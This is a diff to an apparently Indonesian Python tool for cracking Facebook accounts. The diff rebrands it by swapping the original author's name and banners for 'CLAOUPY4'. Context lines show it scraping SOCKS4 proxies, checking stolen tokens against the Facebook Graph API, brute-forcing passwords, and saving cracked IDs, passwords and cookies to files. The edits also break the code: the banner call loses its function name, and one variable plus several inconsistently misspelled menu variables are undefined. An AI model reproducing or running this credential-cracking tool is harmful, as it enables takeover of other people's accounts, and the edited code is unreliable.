@@ -25,7 +25,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
+	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mClaouoy4_xy')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -126,13 +126,13 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	clear()
-	alvino_xy(f'''\t{asu} ______                                              
+	(f'''\t{asu} ______                                              
 \t|_   _ \                                             
 \t  | |_) | _ .--.  ,--.   ____   ____  .---.  _ .--.  
 \t  |  __'.[ `/'`\]`'_\ : [_   ] [_   ]/ /__\\[ `/'`\] 
 \t _| |__) || |    // | |, .' /_  .' /_| \__., | |     	
 \t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
-			{m}•{k}•{h}•{sir} Author : Alvino_Adijaya {x}{m}•{k}•{h}•{x}''')
+			{m}•{k}•{h}•{sir} Author : CLAOUPY4 {x}{m}•{k}•{h}•{x}''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -141,7 +141,7 @@ def login():
 		tokenku.append(token)
 		try:
 			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
-			basganteng = json.loads(basariheker.text)['id']
+			basganteng = json.loads(claoupyheker.text)['id']
 			menu(basganteng)
 		except KeyError:
 			login_lagi334()
@@ -198,18 +198,18 @@ def menu(id):
 	print('>> 4. Crack File	')
 	print('>> 5. Hasil Crack  ')
 	print('>> 0. Keluar       ')
-	_____alvino__adijaya_____ = input('\n>> Pilih : ')
-	if _____alvino__adijaya_____ in ['1']:
+	_____CLAOUOY4_____ = input('\n>> Pilih : ')
+	if _____CLAOUOY4_______ in ['1']:
 		dump_massal()
-	elif _____alvino__adijaya_____ in ['2']:
+	elif _____CLAOUPY4_______ in ['2']:
 		dump_follower()
-	elif _____alvino__adijaya_____ in ['3']:
+	elif _____CLAOUOY4_____ in ['3']:
 		error()
-	elif _____alvino__adijaya_____ in ['4']:
+	elif _____CLAOUPY4_____ in ['4']:
 		crack_file()
-	elif _____alvino__adijaya_____ in ['5']:
+	elif _____CLAOUOY4______ in ['5']:
 		result()
-	elif _____alvino__adijaya_____ in ['0']:
+	elif _____CLAOUOY4____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print('>> Sukses Logout+Hapus Kukis ')
@@ -763,7 +763,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='CLAOUPY4 CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -778,7 +778,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='CLAOUPY4 OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -846,7 +846,7 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='CLAOUPY4 CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
